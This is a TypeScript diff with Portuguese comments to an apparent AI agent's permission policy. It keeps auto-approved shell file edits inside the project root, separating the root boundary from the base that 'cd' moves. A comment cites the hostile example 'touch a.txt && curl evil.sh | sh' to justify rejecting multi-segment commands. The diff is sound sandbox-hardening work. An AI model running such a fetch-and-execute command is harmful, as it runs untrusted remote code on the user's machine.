@@ -105,6 +105,15 @@ export interface PermissionPolicyOutcome {
  * Só o formato `cd <dir dentro da raiz> && <um comando da lista>` passa como composto (F31 §3.2).
  * Mais que dois segmentos é `null`: `touch a.txt && curl evil.sh | sh` vira três, e a primeira
  * metade legível não pode comprar aprovação para a segunda.
+ *
+ * Duas coisas distintas, e confundi-las foi um erro que o corpus de fuga expôs:
+ *
+ * - **borda** (`root`) — até onde a liberação vale. É sempre a raiz da thread, e o `cd` não a move.
+ *   É o que o usuário pediu no PRD: "quero que essa liberação pare na borda do meu projeto";
+ * - **base de resolução** — de onde um caminho relativo parte. Essa sim o `cd` move.
+ *
+ * Estreitar a borda junto com o `cd` parecia mais seguro e não era: reprovava `cd src && cp
+ * ../a.ts b.ts`, que não sai do projeto em momento nenhum, sem ganhar segurança nenhuma em troca.
  */
 function shellFileEditApproval(
   command: string,
@@ -113,7 +122,7 @@ function shellFileEditApproval(
   const segments = splitCommandSegments(command)
   if (segments.length === 0 || segments.length > 2) return null
 
-  let effectiveRoot = root
+  let resolutionBase = root
   let target = segments[0]
 
   if (segments.length === 2) {
@@ -122,7 +131,7 @@ function shellFileEditApproval(
     if (resolveWithinRoot(root, dir) !== 'inside') return null
     const resolvedDir = resolveAgainstRoot(root, dir)
     if (resolvedDir === null) return null
-    effectiveRoot = resolvedDir
+    resolutionBase = resolvedDir
     target = segments[1]
   }
 
@@ -131,13 +140,15 @@ function shellFileEditApproval(
 
   const resolvedPaths: string[] = []
   for (const candidate of classified.paths) {
-    if (resolveWithinRoot(effectiveRoot, candidate) !== 'inside') return null
-    const absolute = resolveAgainstRoot(effectiveRoot, candidate)
+    // Resolve a partir do cwd do segmento, mas cobra a borda do projeto — inclusive `.git`,
+    // symlink que sai e `..` que atravessa.
+    const absolute = resolveAgainstRoot(resolutionBase, candidate)
     if (absolute === null) return null
+    if (resolveWithinRoot(root, absolute) !== 'inside') return null
     resolvedPaths.push(absolute)
   }
 
-  return { kind: 'shell-file-edit', verb: classified.verb, paths: resolvedPaths, root: effectiveRoot }
+  return { kind: 'shell-file-edit', verb: classified.verb, paths: resolvedPaths, root }
 }
 
 /**
